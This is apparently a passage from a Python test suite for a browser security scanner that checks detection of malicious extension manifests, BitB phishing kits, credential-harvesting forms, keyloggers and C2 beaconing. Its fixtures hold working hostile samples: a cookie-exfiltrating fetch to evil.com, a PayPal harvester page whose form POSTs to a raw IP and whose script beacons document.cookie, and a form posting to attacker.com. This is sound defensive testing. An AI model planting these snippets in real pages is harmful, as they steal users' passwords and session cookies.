    return {"detail": "storage-only manifest → all high-risk features = 0"}

async def _tc_c1_malicious_manifest():
    from .c1.features import extract_manifest_features
    manifest = {
        "name": "Evil", "version": "1.0", "manifest_version": 3,
        "permissions": ["webRequest", "cookies", "tabs", "nativeMessaging"],
        "host_permissions": ["<all_urls>"],
        "background": {"service_worker": "bg.js"},
        "content_scripts": [{"matches": ["<all_urls>"], "js": ["inject.js"]}],
    }
    feats = extract_manifest_features(manifest, "")
    assert feats["has_webRequest"] == 1.0
    assert feats["has_all_urls"] == 1.0
    assert feats["has_nativeMessaging"] == 1.0
    assert feats["has_background_script"] == 1.0
    return {"detail": f"malicious manifest → 4 high-risk flags confirmed"}

async def _tc_c1_code_eval_detection():
    from .c1.features import extract_manifest_features
    manifest = {"name": "T", "version": "1", "manifest_version": 3, "permissions": []}
    code = "eval(atob('aGVsbG8=')); document.cookie; fetch('https://evil.com/c2');"
    feats = extract_manifest_features(manifest, code)
    assert feats["eval_count"] > 0, "eval not detected"
    assert feats["atob_count"] > 0, "atob not detected"
    assert feats["cookie_in_code"] > 0, "cookie access not detected"
    assert feats["xhr_fetch_count"] > 0, "fetch not detected"
    return {"detail": f"eval={feats['eval_count']}, atob={feats['atob_count']}, cookie={feats['cookie_in_code']}, fetch={feats['xhr_fetch_count']}"}

async def _tc_c1_entropy():
    from .c1.features import _shannon_entropy
    clean = _shannon_entropy("console.log('hello world');")
    obf = _shannon_entropy("var _0x1a=['\\x68\\x65\\x6c\\x6c\\x6f'];eval(atob('aGVsbG8='));_0x1a[0x0];")
    assert clean >= 0.0
    assert obf > 0.0
    return {"detail": f"clean={clean:.2f} bits, obfuscated={obf:.2f} bits"}

async def _tc_c2_url_phishing():
    await _step("Layer 2 is the URL classifier. First: a classic phishing URL — 'paypal' bait "
                "with a hyphen, on free hosting (yolasite.com)…")
    score_data = await check_url("http://paypal-secure-login.yolasite.com/update")
    assert score_data["score"] > 0.0, f"Phishing URL scored 0: {score_data}"
    await _step(f"The URL model scored it {score_data['score']:.3f} — brand name + hyphen + "
                f"free host are strong phishing signals")
    return {"detail": f"paypal-secure-login.yolasite.com → score={score_data['score']:.3f}"}

async def _tc_c2_url_benign():
    await _step("Same URL layer, now on a normal URL (google.com search) — it must stay low "
                "to avoid false positives…")
    score_data = await check_url("https://www.google.com/search?q=python")
    assert score_data["score"] < 0.8, f"Benign URL scored too high: {score_data['score']}"
    await _step(f"google.com scored {score_data['score']:.3f} — well below the flagging "
                f"threshold, no false positive")
    return {"detail": f"google.com → score={score_data['score']:.3f} (below 0.80 threshold)"}

async def _tc_c2_verified_domain():
    """Verified-domain trust gate: a Tranco-listed site is VERIFIED (no false positive),
    while a phishing page on a free-hosting subdomain is NOT trusted."""
    await _step("The trust gate: 50,000 verified domains (Tranco list) skip heuristic scanning "
                "entirely. Even if google.com served markup that trips the DOM heuristics…")
    # google.com served with markup that normally trips L1 heuristics.
    noisy_dom = ('<html><body style="position:fixed;user-select:none">'
                 '<div style="z-index:99999"></div></body></html>')
    g = await analyze(AnalyzeReq(url="https://www.google.com/search?q=python", dom=noisy_dom))
    assert g["verdict"] == "VERIFIED", f"google.com expected VERIFIED, got {g['verdict']} ({g['risk_score']})"
    assert g["risk_score"] == 0.0, f"google.com risk should be 0, got {g['risk_score']}"
    await _step("google.com → VERIFIED with risk 0 despite the noisy markup. But a phishing "
                "page on a free-hosting subdomain must NOT inherit trust…")
    # Free-host subdomain must bypass verification and be scanned normally.
    y = await analyze(AnalyzeReq(url="http://paypal-login.yolasite.com/x",
                                 dom='<html><body><form action="http://evil.tld/x">'
                                     '<input type=password></form></body></html>'))
    assert y["verdict"] != "VERIFIED", f"yolasite subdomain wrongly VERIFIED ({y['risk_score']})"
    await _step(f"paypal-login.yolasite.com bypassed the gate and was scanned → "
                f"{y['verdict']} (risk {y['risk_score']})")
    return {"detail": f"google.com → VERIFIED (risk 0); paypal-login.yolasite.com → {y['verdict']} (risk {y['risk_score']})"}

async def _tc_c2_form_offsite():
    await _step("Layer 4 watches where forms SEND data. Here a password form on a bank page "
                "POSTs to attacker.com — credential harvesting…")
    dom = """<html><body><form action="https://attacker.com/steal" method="POST">
    <input type="password" name="pass"/></form></body></html>"""
    res = await check_form("https://legitimate-bank.com/login", dom)
    assert res["score"] > 0.5, f"Off-domain form scored {res['score']}"
    await _step(f"Off-domain password POST flagged: L4={res['score']:.2f}")
    return {"detail": f"form→attacker.com from legitimate-bank.com → score={res['score']:.2f}"}

async def _tc_c2_form_samedomain():
    await _step("The flip side: a password form POSTing to its OWN site (mybank.com → /submit) "
                "is normal behaviour and must score zero…")
    dom = """<html><body><form action="/submit" method="POST">
    <input type="password" name="pass"/></form></body></html>"""
    res = await check_form("https://mybank.com/login", dom)
    assert res["score"] == 0.0, f"Same-domain form scored {res['score']} (expected 0)"
    await _step("Same-origin form scored 0.00 — everyday logins stay unflagged")
    return {"detail": f"form→/submit from mybank.com → score=0.00 (safe)"}

async def _tc_c2_browser_phish():
    """Navigate Playwright browser to phishing test page and analyze live."""
    test_url = "http://127.0.0.1:8765/dev/test-page/c2-phish"
    phish_html = _TEST_PAGES["c2-phish"]
    await _step("Opening a synthetic BitB attack page in the live browser — a fake overlay "
                "window with a fake address bar covering the whole viewport…")
    # Navigate browser to the test page (visual demonstration)
    await _ensure_browser_running()
    try:
        await pw_session.navigate(test_url)
        await _step("Attack page rendered — the 'browser window' you see is drawn by the "
                    "page itself. Scoring it with the DOM/URL/form layers…")
    except Exception:
        pass
    # Run C2 analysis on the phishing HTML directly
    res = await check_bitb(test_url, phish_html)
    assert res["score"] > 0.3, f"Phishing page scored too low: {res['score']}"
    url_res = await check_url(test_url)
    form_res = await check_form(test_url, phish_html)
    rep_res  = await check_reputation(test_url, settings.get("gsb_key", ""))
    combined = round(min(1.0, res["score"] * 0.35 + url_res["score"] * 0.30 + form_res["score"] * 0.20 + rep_res["score"] * 0.15), 3)
    await _step(f"Layers fired: BitB DOM={res['score']:.2f}, URL={url_res['score']:.2f}, "
                f"Form={form_res['score']:.2f} → combined {combined:.2f}")
    return {
        "detail": f"BitB={res['score']:.2f} URL={url_res['score']:.2f} Form={form_res['score']:.2f} → combined={combined:.2f}",
        "browser_url": test_url,
    }

async def _tc_c2_browser_clean():
    """Navigate Playwright browser to clean test page and verify low score."""
    test_url = "http://127.0.0.1:8765/dev/test-page/c2-clean"
    clean_html = _TEST_PAGES["c2-clean"]
    await _step("Opening a normal blog page in the live browser — the detector must stay "
                "quiet on everyday pages…")
    await _ensure_browser_running()
    try:
        await pw_session.navigate(test_url)
        await _step("Blog page rendered — no overlays, no fake chrome. Scoring it…")
    except Exception:
        pass
    res = await check_bitb(test_url, clean_html)
    assert res["score"] < 0.8, f"Clean page scored too high: {res['score']}"
    await _step(f"Clean page scored {res['score']:.2f} — below the flagging threshold, no "
                f"false positive")
    return {
        "detail": f"Clean blog page → BitB score={res['score']:.2f} (below 0.80 threshold)",
        "browser_url": test_url,
    }

# ── C2 realistic scenario tests ──────────────────────────────────────────────
# Page assets: test/C2/pages/ (real mrd0x BitB kits via build_pages.py + scenario
# pages), served to the live browser through /dev/test-page/<name>.

_C2_TESTPAGE_BASE = "http://127.0.0.1:8765/dev/test-page"
_C2_MS_LOOKALIKE  = "https://login.microsoft.com.evil-phish.xyz/oauth2/v2.0/authorize"


def _c2_page(name: str) -> str:
    key = f"c2-{name}"
    assert key in _TEST_PAGES, f"test page '{key}' missing — run: python test/C2/build_pages.py"
    return _TEST_PAGES[key]


def _layer(result: dict, lid: str) -> dict:
    return next((l for l in result.get("layers", []) if l["id"] == lid), {})


async def _tc_c2_kit_windows():
    """Real mrd0x BitB kit (Windows Chrome template) rendered in the live browser,
    analyzed through the full pipeline as if hosted on a Microsoft lookalike domain."""
    await _ensure_browser_running()
    test_url = f"{_C2_TESTPAGE_BASE}/c2-bitb-kit-windows"
    await _step("Opening the real mrd0x BitB kit (Windows Chrome template) in the live "
                "browser — the victim landed here via a link, as if it were hosted on "
                "login.microsoft.com.evil-phish.xyz")
    await pw_session.navigate(test_url)
    await _step("Kit rendered. Look at the browser window: the page has drawn a FAKE "
                "browser window inside itself — the 'address bar' showing "
                "login.microsoftonline.com is just pixels, not real chrome")
    dom = await pw_session.get_dom()
    await _step("Extracting the rendered DOM and running the 6-layer analysis…")
    res = await analyze(AnalyzeReq(url=_C2_MS_LOOKALIKE, dom=dom))
    l1 = _layer(res, "L1")
    assert l1.get("score", 0) >= 0.75, f"Real BitB kit L1 too low: {l1.get('score')}"
    assert "fake browser window chrome" in l1.get("detail", ""), \
        f"window-chrome signature missing: {l1.get('detail')}"
    assert res["verdict"] == "PHISHING", f"expected PHISHING, got {res['verdict']} ({res['risk_score']})"
    await _step(f"L1 BitB layer scored {l1['score']:.2f} — fake window chrome + draggable "
                f"window signatures fired. Decisive-signal floor → {res['verdict']} "
                f"({res['risk_score']}/100)")
    return {"detail": f"mrd0x Windows kit → L1={l1['score']:.2f} "
                      f"({l1['detail'].split(' | ')[-1][:60]}) → {res['verdict']} {res['risk_score']}",
            "browser_url": test_url}


async def _tc_c2_kit_macos():
    """Real mrd0x BitB kit (macOS Chrome template) — same attack, different skin."""
    await _ensure_browser_running()
    test_url = f"{_C2_TESTPAGE_BASE}/c2-bitb-kit-macos"
    await _step("Opening the macOS variant of the same mrd0x kit — same attack, different skin")
    await pw_session.navigate(test_url)
    await _step("Rendered — the fake window now mimics macOS Chrome (traffic-light buttons, "
                "fake URL bar). The DOM signatures are skin-independent")
    dom = await pw_session.get_dom()
    res = await analyze(AnalyzeReq(url=_C2_MS_LOOKALIKE, dom=dom))
    l1 = _layer(res, "L1")
    assert l1.get("score", 0) >= 0.75, f"Real BitB kit L1 too low: {l1.get('score')}"
    assert res["verdict"] == "PHISHING", f"expected PHISHING, got {res['verdict']} ({res['risk_score']})"
    await _step(f"L1={l1['score']:.2f} → {res['verdict']} ({res['risk_score']}/100) — "
                f"detected regardless of the visual skin")
    return {"detail": f"mrd0x macOS kit → L1={l1['score']:.2f} → {res['verdict']} {res['risk_score']}",
            "browser_url": test_url}


async def _tc_c2_scenario_oauth():
    """Scenario: fake Microsoft OAuth popup (mrd0x Windows kit) hosted on a
    lookalike domain. Static full-pipeline analysis of the real kit markup."""
    await _step("Scenario: the attacker hosts the same fake-OAuth popup kit on a Microsoft "
                "lookalike domain (login.microsoft.com.evil-phish.xyz). Running the full "
                "pipeline on the kit markup…")
    res = await analyze(AnalyzeReq(url=_C2_MS_LOOKALIKE, dom=_c2_page("bitb-kit-windows")))
    l1, l2 = _layer(res, "L1"), _layer(res, "L2")
    assert res["verdict"] == "PHISHING", f"expected PHISHING, got {res['verdict']} ({res['risk_score']})"
    await _step(f"Both layers fired: L1 (fake window DOM)={l1.get('score', 0):.2f}, "
                f"L2 (lookalike URL)={l2.get('score', 0):.2f} → {res['verdict']} "
                f"{res['risk_score']}/100")
    return {"detail": f"lookalike-domain OAuth popup → L1={l1.get('score', 0):.2f} "
                      f"L2={l2.get('score', 0):.2f} → {res['verdict']} {res['risk_score']}"}


async def _tc_c2_scenario_freehost():
    """Scenario: PayPal credential harvester on free hosting — off-domain form POST,
    brand title/favicon, cookie-beacon exfil script. L5 (reputation) is 0 without a
    GSB key; with one it adds up to 20 pts, pushing this past the PHISHING cutoff."""
    dom = """<html><head><title>PayPal - Sign In</title>
    <link rel="icon" href="https://www.paypal.com/favicon.ico"/></head>
    <body style="margin:0"><div style="max-width:380px;margin:60px auto;padding:24px;border:1px solid #ddd">
    <h2>Log in to PayPal</h2>
    <form action="http://198.51.100.44/collect/paypal" method="POST">
      <input type="email" name="login_email" placeholder="Email"/>
      <input type="password" name="login_password" placeholder="Password"/>
      <input type="hidden" name="locale" value="en-US"/>
      <button type="submit">Log In</button>
    </form>
    <script>fetch('http://198.51.100.44/beacon',{method:'POST',body:document.cookie});</script>
    </div></body></html>"""
    url = "http://paypal-secure-login.yolasite.com/update"
    await _step("Scenario: a PayPal credential harvester on free hosting (yolasite). The form "
                "POSTs the password to a raw IP off-domain and a script beacons the cookies…")
    res = await analyze(AnalyzeReq(url=url, dom=dom))
    l4 = _layer(res, "L4")
    assert l4.get("score", 0) >= 0.5, f"off-domain harvest form L4 too low: {l4.get('score')}"
    assert res["verdict"] in ("SUSPICIOUS", "PHISHING"), \
        f"expected SUSPICIOUS+, got {res['verdict']} ({res['risk_score']})"
    await _step(f"L4 (form destination)={l4['score']:.2f} — password form POSTs off-origin → "
                f"{res['verdict']} {res['risk_score']}/100")
    return {"detail": f"free-host harvester → L4={l4['score']:.2f} "
                      f"(off-domain POST + password field) → {res['verdict']} {res['risk_score']}"}


async def _tc_c2_scenario_compromised():
    """Scenario: BitB kit injected into a compromised legitimate site — the URL is
    clean, so only the DOM signals can catch it. Previously fused to 5/100 (SAFE);
    the decisive-signal floor now forces PHISHING."""
    await _step("Scenario: the hardest case — the BitB kit is injected into a COMPROMISED "
                "legitimate site (hillside-bakery.com). The URL is perfectly clean, so only "
                "the DOM can catch it…")
    res = await analyze(AnalyzeReq(url="https://www.hillside-bakery.com/news",
                                   dom=_c2_page("bitb-kit-windows")))
    l1 = _layer(res, "L1")
    assert res["verdict"] == "PHISHING", \
        f"kit on clean domain should be PHISHING via floor, got {res['verdict']} ({res['risk_score']})"
    await _step(f"URL layers score ~0, but L1={l1.get('score', 0):.2f} and the "
                f"decisive-signal floor forces {res['verdict']} ({res['risk_score']}/100) — "
                f"this was SAFE before the floor existed")
    return {"detail": f"clean-URL kit → L1={l1.get('score', 0):.2f} heuristic floor → "
                      f"{res['verdict']} {res['risk_score']} (was SAFE before the floor)"}


async def _tc_c2_runtime_keylogger():
    """Live runtime-behavior scenario: the page keylogs the password field, hooks the
    clipboard, blocks drag/selection, and exfiltrates credentials off-origin. The L6
    signals are collected non-invasively (CDP + network observer) after the active
    probe trips the keylogger, then the block interstitial is verified on the page."""
    await _ensure_browser_running()
    test_url = f"{_C2_TESTPAGE_BASE}/c2-keylogger-harvest"
    await _step("Opening a fake Microsoft login page that looks completely normal — but its "
                "scripts attach a keylogger to the password field and hook the clipboard")
    await pw_session.navigate(test_url)
    await asyncio.sleep(0.6)  # let page scripts attach listeners
    await _step("Page rendered. Now typing synthetic keystrokes into the password field "
                "(the active probe) — a real user's keystrokes would be captured the same way")
    # First call trips the keylogger with synthetic keys (the probe's POST is only
    # observed by the network listener after it runs), second call picks it up.
    await pw_session.get_runtime_signals(active_probe=True)
    await asyncio.sleep(0.8)
    signals = await pw_session.get_runtime_signals()
    l6 = await check_runtime(test_url, signals)
    await _step(f"The keylogger fired and POSTed the captured keys off-origin to "
                f"{', '.join(signals.get('exfil_hosts', [])) or '?'} — caught by the "
                f"non-invasive network observer + CDP listener scan. L6 runtime layer: "
                f"{l6['score']:.2f}")
    assert l6["score"] >= 0.4, f"keylogger page L6 too low: {l6['score']} ({signals})"
    assert signals.get("exfil_hosts"), f"off-origin exfil POST not observed: {signals}"
    assert signals.get("kb_on_password"), f"password keylogger not detected: {signals}"

    dom = await pw_session.get_dom()
    res = await analyze(AnalyzeReq(url=test_url, dom=dom, runtime=signals))
    assert res["risk_score"] >= settings.get("verdict_suspicious", 30), \
        f"expected at least SUSPICIOUS, got {res['verdict']} ({res['risk_score']})"

    await pw_session.inject_interstitial("block", res)
    page = pw_session._page
    overlay = await page.evaluate("!!document.getElementById('__ws_overlay')")
    assert overlay, "block interstitial overlay did not appear on the live page"
    await _step(f"Fused verdict: {res['verdict']} ({res['risk_score']}/100). The BLOCK "
                f"interstitial is on the live page right now — this is what a real user "
                f"sees before any credentials reach the attacker")
    await page.evaluate("document.getElementById('__ws_continue').click()")
    await asyncio.sleep(0.2)
    gone = await page.evaluate("!document.getElementById('__ws_overlay')")
    assert gone, "'Continue anyway' did not dismiss the overlay"
    await _step("Overlay dismissed via 'Continue anyway' (user choice is preserved, but the "
                "warning was impossible to miss)")
    return {"detail": f"keylogger+exfil → L6={l6['score']:.2f} "
                      f"({', '.join(signals.get('exfil_hosts', [])) or 'no exfil'} observed) → "
                      f"{res['verdict']} {res['risk_score']} · block overlay shown & dismissed",
            "browser_url": test_url}


async def _tc_c2_benign_login():
    """Realistic legitimate bank login — fixed header, high-z-index cookie modal,
    same-origin password form, security-tips text mentioning the address bar.
    Carries every FP trap L1 heuristics look for; fused verdict must stay SAFE."""
    await _ensure_browser_running()
    test_url = f"{_C2_TESTPAGE_BASE}/c2-benign-login"
    await _step("Opening a REALISTIC legitimate bank login — it has every false-positive trap: "
                "fixed header, a full-screen cookie modal, user-select:none, security tips "
                "mentioning the address bar, and a same-origin password form")
    await pw_session.navigate(test_url)
    dom = await pw_session.get_dom()
    await _step("Page rendered. Running the same 6-layer analysis that flagged the attacks…")
    res = await analyze(AnalyzeReq(url="https://www.acmebank.com/auth/login", dom=dom))
    l4 = _layer(res, "L4")
    assert l4.get("score", 1) == 0.0, f"same-origin login form wrongly flagged: {l4.get('score')}"
    assert res["verdict"] == "SAFE", f"legit login page not SAFE: {res['verdict']} ({res['risk_score']})"
    await _step(f"Verdict: {res['verdict']} ({res['risk_score']}/100) — no false positive. "
                f"The detector distinguishes a real login page from an attack")
    return {"detail": f"realistic bank login (fixed nav + modal + same-origin form) → "
                      f"{res['verdict']} {res['risk_score']}, L4={l4.get('score', 0):.2f}",
            "browser_url": test_url}


async def _tc_c3_beacon_iat():
    from .c3.feature_engine import compute_features
    import time as _t
    now = _t.time()
    events = [{"timestamp": now + i * 5.0, "url": "http://c2.evil/beacon",
               "method": "GET", "size_bytes": 256, "idle_time_ms": 4800,
               "user_was_active": False, "is_background_tab": True, "is_extension_origin": False}
              for i in range(20)]
    feats = compute_features(events)
    assert feats["iat_cv"] < 0.10, f"Beacon IAT CV too high: {feats['iat_cv']}"
    assert feats["background_tab_ratio"] == 1.0
    return {"detail": f"20 regular beacons @5s → IAT-CV={feats['iat_cv']:.4f} BG-ratio={feats['background_tab_ratio']:.2f}"}

async def _tc_c3_human_iat():
    from .c3.feature_engine import compute_features
    import time as _t
    now = _t.time()
    urls = ["https://github.com", "https://google.com", "https://stackoverflow.com",
            "https://wikipedia.org", "https://news.ycombinator.com"]
    events = [{"timestamp": now + sum(range(i + 1)) * (3 + i % 7),
               "url": urls[i % len(urls)], "method": "GET", "size_bytes": 50000 + i * 1200,
               "idle_time_ms": 100, "user_was_active": True, "is_background_tab": False,
               "is_extension_origin": False}
              for i in range(15)]
    feats = compute_features(events)
    assert feats["iat_cv"] > 0.10, f"Human browsing IAT CV too low: {feats['iat_cv']}"
    assert feats["user_active_ratio"] == 1.0
    return {"detail": f"15 human browsing events → IAT-CV={feats['iat_cv']:.4f} (irregular, >0.10)"}

async def _tc_c3_fusion_beacon():
    from .c3.risk_fusion import C3RiskFusion
    fusion = C3RiskFusion()
    result = fusion.fuse(rf=0.8, reputation=0.9, heuristic=0.7)
    assert result["verdict"] == "BEACON", f"Expected BEACON, got {result['verdict']}"
    assert result["score"] >= 0.6
    return {"detail": f"rf=0.8 rep=0.9 heuristic=0.7 → verdict={result['verdict']} score={result['score']:.2f}"}

async def _tc_c3_fusion_safe():
    from .c3.risk_fusion import C3RiskFusion
    fusion = C3RiskFusion()
    result = fusion.fuse(rf=0.0, reputation=0.0, heuristic=0.0)
    assert result["verdict"] == "SAFE", f"Expected SAFE, got {result['verdict']}"
    return {"detail": f"all signals=0 → verdict={result['verdict']} score={result['score']:.2f}"}

# ══════════════════════════════════════════════════════════════════════════════
# C4 — real-world forensic case
# ══════════════════════════════════════════════════════════════════════════════
# Every C4 row runs against evidence that exists on disk. Two sources feed it:
#
#   1. the live browser profile this session is driving (real Chromium artifacts)
#   2. a planted case profile — real Chrome-schema SQLite databases, real
#      AES-256-GCM credential blobs under a DPAPI-sealed master key, a real
#      dropped file, real LevelDB records (see core/c4/demo_case.py)
#
# The detectors are never hand-fed event dictionaries: the production extractor
# parses those files, exactly as a C4 scan of a seized profile would. The rows
# then walk one stage of the pipeline each, so the panel shows where a finding
# came from rather than just that it appeared.
_C4_CASE: dict = {}


def _c4_state(key):
    if key not in _C4_CASE:
        raise AssertionError(
            "C4 case profile not built — run the full C4 sequence from the start")
    return _C4_CASE[key]


def _c4_live_profile():
    """The browser profile this session is actually using."""
    from .c4.extractor import get_chrome_path
    pw_default = os.path.join(PW_PROFILE_DIR, "Default")
    profile = pw_default if os.path.isdir(pw_default) else get_chrome_path()
    assert profile and os.path.isdir(profile), (
        "No live browser profile found — start the Playwright session (Live tab) "
        "so C4 has a real profile to read")
    return profile


def _c4_live_tmp():
    tmp = os.path.join(tempfile.gettempdir(), "c4_live_probe")
    os.makedirs(tmp, exist_ok=True)
    return tmp


async def _ensure_browser_running():
    """Auto-launch the shared Playwright browser if it isn't already up.

    Waits out an in-progress startup rather than racing it (server boot already
    kicks one off via the lifespan hook), and only calls start() itself if
    nothing is happening.
    """
    global _session_starting
    if pw_session.is_running:
        return
    if _session_starting:
        for _ in range(40):
            await asyncio.sleep(0.5)
            if pw_session.is_running:
                return
    if not pw_session.is_running:
        _session_starting = True
        try:
            await pw_session.start()
        finally:
            _session_starting = False


# 15 real, legitimate, long-lived domains — a Sri Lankan-weighted set (government,
# education, news, banking) plus a handful of well-known international sites, so
# the resulting History file reads like genuine local + general browsing rather
# than a scripted probe of one or two sites.
_C4_LIVE_TOUR = [
    # Sri Lanka — government / official
    "https://www.gov.lk/", "https://www.cbsl.gov.lk/", "https://www.police.lk/",
    "https://www.customs.gov.lk/",
    # Sri Lanka — education
    "https://www.sliit.lk/", "https://www.uom.lk/", "https://www.pdn.ac.lk/",
    # Sri Lanka — news
    "https://www.adaderana.lk/", "https://www.newsfirst.lk/",
    # Sri Lanka — banking
    "https://www.combank.lk/",
    # other legitimate sites — dev/tech, reference, news, security research
    "https://github.com/", "https://en.wikipedia.org/wiki/Phishing",
    "https://www.python.org/", "https://www.bbc.com/news", "https://www.eicar.org/",
]


async def _tc_c4_live_history():
    """Browsing history off the profile the live browser is writing to.

    Auto-launches the Playwright browser if it isn't already running, then drives
    it through 15 real, legitimate sites (Sri Lankan government/education/news/
    banking plus a few international ones) so there is genuine, fresh, multi-domain
    history on disk to extract — not a handful of stale visits. The panel shows
    the browser window actually navigating, then those same domains coming back
    out of the real SQLite History file.
    """
    from urllib.parse import urlparse
    from .c4.extractor import collect_manifest, extract_history

    await _ensure_browser_running()

    visited = []
    for site in _C4_LIVE_TOUR:
        try:
            await pw_session.navigate(site, timeout=7_000)
            visited.append(site)
            await asyncio.sleep(0.3)
        except Exception:
            pass
    assert visited, "Could not drive the live browser to any site — session failed to start or navigate"

    profile = _c4_live_profile()
    loop = asyncio.get_event_loop()
    visited_domains = {urlparse(s).netloc for s in visited}

    # Chrome's History backend batches its SQLite commit (~10s interval), so the
    # freshly-navigated visits may not be on disk the instant we copy the file.
    # Poll instead of guessing a fixed wait.
    events, warning, confirmed = [], None, []
    for _ in range(13):
        events, warning = await loop.run_in_executor(None, extract_history, profile, _c4_live_tmp())
        found_domains = {urlparse(e["detail"].get("url", "")).netloc for e in events}
        confirmed = sorted(visited_domains & found_domains)
        if len(confirmed) >= min(8, len(visited)):
            break
        await asyncio.sleep(1)
    manifest = await loop.run_in_executor(None, collect_manifest, profile)
    assert events, f"No history read from the live profile — {warning or 'profile is empty'}"
    assert confirmed, "The sites just navigated to haven't hit the History file yet — Chrome batches its commits"

    newest = events[0].get("timestamp", "")[:19].replace("T", " ")
    return {
        "detail": f"{len(events)} real visits read from the running browser's profile · "
                  f"drove the live browser to {len(visited)}/{len(_C4_LIVE_TOUR)} real sites, "
                  f"{len(confirmed)} confirmed back in history (e.g. {', '.join(confirmed[:6])}"
                  f"{', …' if len(confirmed) > 6 else ''}) · "
                  f"{len(manifest)} evidence file(s) hashed · newest visit {newest}",
        "browser_url": visited[-1],
    }


async def _tc_c4_live_download():
    """A real file, downloaded through the live browser, picked up by the same
    production downloads extractor a seized-profile scan would use — genuine
    bytes on disk, hashed straight off the file, not asserted."""
    from .c4.extractor import extract_downloads, extract_history

    download_url = "https://www.irs.gov/pub/irs-pdf/f1040.pdf"

    await _ensure_browser_running()

    info = await pw_session.download_file(download_url)
    assert info.get("path"), "Browser did not report a completed download"
    assert os.path.exists(info["path"]), f"Downloaded file missing on disk: {info['path']}"

    profile = _c4_live_profile()
    loop = asyncio.get_event_loop()

    # extract_downloads deliberately reuses the History_c4 copy extract_history
    # just made (production's run_extraction calls history before downloads, to
    # avoid copying the live-locked file twice) — so refresh that copy first on
    # each poll, same ~10s Chrome commit-batching wait as the history test.
    events, warning, match = [], None, None
    for _ in range(13):
        await loop.run_in_executor(None, extract_history, profile, _c4_live_tmp())
        events, warning = await loop.run_in_executor(None, extract_downloads, profile, _c4_live_tmp())
        match = next((e for e in events if e["detail"].get("target_path") == info["path"]), None)
        if match:
            break
        await asyncio.sleep(1)
    assert match, (f"Download not yet recorded in History.db's downloads table — "
                    f"{warning or info['path']}")

    real_hash = match["detail"].get("sha256", "")
    assert real_hash and real_hash != "file not on disk", "Downloaded file wasn't hashed off disk"

    size = match["detail"].get("size_bytes", 0)
    return {
        "detail": f"Real file downloaded via the live browser: {info['suggested_filename']} "
                  f"({size:,} bytes) from {download_url} · sha256={real_hash[:24]}… "
                  f"hashed straight off the file on disk, read back through History.db's "
                  f"downloads table",
        "browser_url": download_url,
    }


async def _tc_c4_live_malware_download():
    """The EICAR anti-malware test file, downloaded through the live browser, then
    run through C4's OWN rule engine — proves the component's dangerous-download
    detectors fire on a real, live download, not a hand-fed event dict. R02b
    (Chrome's own Safe Browsing content check) is the one expected to reliably
    fire here; R02 (extension check) only fires if the on-disk filename happens
    to survive Playwright's download automation, which usually renames it to an
    opaque ID with no extension — see the comment below the poll loop. Also
    reports whether Windows Defender quarantined the file after it landed.
    """
    from .c4.extractor import extract_downloads, extract_history, sha256 as file_sha256
    from .c4.rules import apply_single_artifact_rules

    download_url = "http://127.0.0.1:8765/dev/test-file/eicar"

    await _ensure_browser_running()

    info = await pw_session.download_file(download_url)
    assert info.get("path"), (
        "Chrome never reported a completed download — Windows Defender or Chrome's own "
        "Safe Browsing likely blocked/interrupted the EICAR test file before it finished "
        "writing to disk. That's itself a real detection outcome, just one this specific "
        "check can't inspect further (there's no target_path to look up in History.db). "
        "Check the Downloads folder and Windows Security's Protection History.")

    # Windows Defender's real-time scanner may quarantine/delete the file the
    # instant it lands — that's a genuine detection event in its own right, not
    # a test failure, so check for it rather than assuming the file survives.
    on_disk = os.path.exists(info["path"])
    file_hash = file_sha256(info["path"]) if on_disk else ""

    profile = _c4_live_profile()
    loop = asyncio.get_event_loop()
    events, warning, match = [], None, None
    for _ in range(13):
        await loop.run_in_executor(None, extract_history, profile, _c4_live_tmp())
        events, warning = await loop.run_in_executor(None, extract_downloads, profile, _c4_live_tmp())
        match = next((e for e in events if e["detail"].get("target_path") == info["path"]), None)
        if match:
            break
        await asyncio.sleep(1)
    assert match, (f"Download not yet recorded in History.db's downloads table — "
                    f"{warning or info['path']}")

    apply_single_artifact_rules([match])
    fired = {f["rule"] for f in match.get("rule_flags", [])}
    # R02 (extension) can't see ".com" here: Playwright saves automated downloads
    # in a persistent context under an opaque internal ID with no extension at
    # all, so that's genuinely what lands in Chrome's own History.db — a quirk of
    # automating the download, not of a real user's browser. R02b doesn't care
    # about the filename: it's Chrome's own Safe Browsing engine recognizing the
    # actual EICAR content signature, so either one firing is real detection.
    assert fired & {"R02", "R02b"}, (
        f"C4's own rule engine did not flag this download as dangerous at all — "
        f"rule_flags={match.get('rule_flags')}")

    if on_disk:
        authentic = " (byte-identical to the public EICAR signature)" if file_hash == EICAR_SHA256 else ""
        disk_note = f"file survived on disk, sha256={file_hash[:24]}…{authentic}"
    else:
        disk_note = "Windows Defender removed the file the instant Chrome wrote it — real-time quarantine"
    fired_notes = []
    if "R02b" in fired:
        fired_notes.append("R02b (Chrome's own Safe Browsing caught the malware signature live)")
    if "R02" in fired:
        fired_notes.append("R02 (dangerous file extension)")

    return {
        "detail": f"Downloaded the official EICAR anti-malware test file through the live "
                  f"browser · C4's own rule engine flagged it live: {', '.join(fired_notes)} · "
                  f"{disk_note}",
        "browser_url": download_url,
    }


async def _tc_c4_live_cookies():
    """Cookies — locked on disk while the browser runs, so taken from the session."""
    from .c4.extractor import extract_cookies
    profile = _c4_live_profile()
    jar = await _live_cookie_jar()
    loop = asyncio.get_event_loop()
    events, warning = await loop.run_in_executor(
        None, extract_cookies, profile, _c4_live_tmp(), jar)
    assert events, (
        "No cookies recovered. The Cookies database is locked by the running "
        "browser and no live jar was available — start the Playwright session "
        "(Live tab) and browse to a site, then re-run."
        if jar is None else f"Live jar acquired but empty — {warning or 'no cookies set yet'}")

    live = sum(1 for e in events if e["detail"].get("acquisition") == "live")
    sensitive = [e for e in events if e.get("risk_flag")]
    hosts = sorted({e["detail"]["host"].lstrip(".") for e in events})
    source = ("acquired live from the running browser (Cookies DB holds an "
              "exclusive lock)" if live else "read from the Cookies database on disk")
    return {"detail": f"{len(events)} real cookie(s) across {len(hosts)} host(s) {source} · "
                      f"{len(sensitive)} session/auth token(s) flagged · "
                      f"{', '.join(hosts[:4])}"}


_C4_LIVE_LOGIN_ORIGIN = "https://c4-livetest.websentinel.internal"
_C4_LIVE_LOGIN_USER = "c4-livetest@websentinel.internal"
_C4_LIVE_LOGIN_PASSWORD = "C4LiveTest!2026"


async def _tc_c4_live_login_plant():
    """Plant one genuine saved login into the live profile's real Login Data
    store — the live-evidence counterpart to the history/download tests above,
    so the dashboard's Login Data tab has real, non-zero rows instead of the
    profile simply never having saved a password.

    Playwright exposes no API to drive Chrome's native "save password?" bubble
    (it lives outside the page DOM), and the Login Data file is held open for
